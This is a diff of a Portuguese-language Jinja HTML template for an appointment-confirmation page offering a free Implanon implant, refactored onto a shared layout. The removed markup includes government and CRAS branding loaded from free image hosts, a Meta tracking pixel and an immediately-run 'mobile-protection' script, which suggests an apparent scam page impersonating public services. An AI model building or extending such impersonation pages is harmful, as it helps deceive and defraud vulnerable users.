@@ -1,109 +1,8 @@
-<html>
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Prosegur - Confirmação de Agendamento</title>
-    <script src="https://cdn.tailwindcss.com"></script>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
-    <style>
-        /* Rawline Font Family */
-        @font-face {
-          font-family: 'Rawline';
-          src: url("{{ url_for('static', filename='fonts/rawline-400.ea42a37247439622.woff2') }}") format('woff2');
-          font-weight: 400;
-          font-style: normal;
-        }
-        @font-face {
-          font-family: 'Rawline';
-          src: url("{{ url_for('static', filename='fonts/rawline-500.f8af4ec801afaa28.woff2') }}") format('woff2');
-          font-weight: 500;
-          font-style: normal;
-        }
-        @font-face {
-          font-family: 'Rawline';
-          src: url("{{ url_for('static', filename='fonts/rawline-600.844a17f0db94d147.woff2') }}") format('woff2');
-          font-weight: 600;
-          font-style: normal;
-        }
-        @font-face {
-          font-family: 'Rawline';
-          src: url("{{ url_for('static', filename='fonts/rawline-700.4b7902400c7e32ac.woff2') }}") format('woff2');
-          font-weight: 700;
-          font-style: normal;
-        }
+{% extends "layout.html" %}
 
-        body {
-            font-family: 'Rawline', sans-serif;
-            font-size: 16px;
-            color: #555;
-            line-height: 1.5;
-        }
+{% block title %}Confirmação de Agendamento - Implanon Gratuito{% endblock %}
 
-        /* Consistent Font Weight for Bold Elements */
-        strong, .font-bold {
-          font-weight: 500 !important;
-        }
-
-        /* Standard Text Sizes and Colors */
-        .text-base {
-          font-size: 16px;
-          color: #555;
-          line-height: 1.5;
-        }
-    </style>
-    
-    <!-- Mobile Protection - Execute immediately -->
-    <script src="{{ url_for('static', filename='mobile-protection.js') }}"></script>
-    
-    <!-- Meta Pixel Code for Sales Tracking -->
-    <script>
-    !function(f,b,e,v,n,t,s)
-    {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
-    n.callMethod.apply(n,arguments):n.queue.push(arguments)};
-    if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
-    n.queue=[];t=b.createElement(e);t.async=!0;
-    t.src=v;s=b.getElementsByTagName(e)[0];
-    s.parentNode.insertBefore(t,s)}(window, document,'script',
-    'https://connect.facebook.net/en_US/fbevents.js');
-    
-    // Initialize the specific pixel for sales tracking
-    fbq('init', '1418766538994503');
-    fbq('track', 'PageView');
-    </script>
-    <noscript>
-    <img height="1" width="1" style="display:none" 
-    src="https://www.facebook.com/tr?id=1418766538994503&ev=PageView&noscript=1" />
-    </noscript>
-    <!-- End Meta Pixel Code -->
-</head>
-<body>
-    <!-- Government Header -->
-    <header class="bg-[#222222] text-white py-2">
-        <div class="container mx-auto flex justify-between items-center px-4">
-            <a class="font-bold text-sm" href="#">
-                <img src="https://i.ibb.co/TDkn2RR4/Imagem-29-03-2025-a-s-17-32.jpg" alt="Logotipo Governo" class="h-6" />
-            </a>
-            <nav>
-                <ul class="flex space-x-4 text-[10px]">
-                    <li>
-                        <a class="hover:underline" href="#">ACESSO À INFORMAÇÃO</a>
-                    </li>
-                    <li>
-                        <a class="hover:underline" href="#">PARTICIPE</a>
-                    </li>
-                    <li>
-                        <a class="hover:underline" href="#">SERVIÇOS</a>
-                    </li>
-                </ul>
-            </nav>
-        </div>
-    </header>
-    <!-- CRAS Header -->
-    <div class="bg-[#044785] py-3">
-        <div class="container mx-auto px-4 text-center">
-            <img src="https://i.postimg.cc/zvmGLmsw-/Localiza-Fone-4-1-1.png" alt="Logo CRAS" class="h-8 mx-auto" />
-        </div>
-    </div>
+{% block content %}
 
     <!-- Main Content -->
     <section class="py-10 md:py-14">
@@ -1067,5 +966,4 @@
             }, 3000);
         });
     </script>
-</body>
-</html>
+{% endblock %}
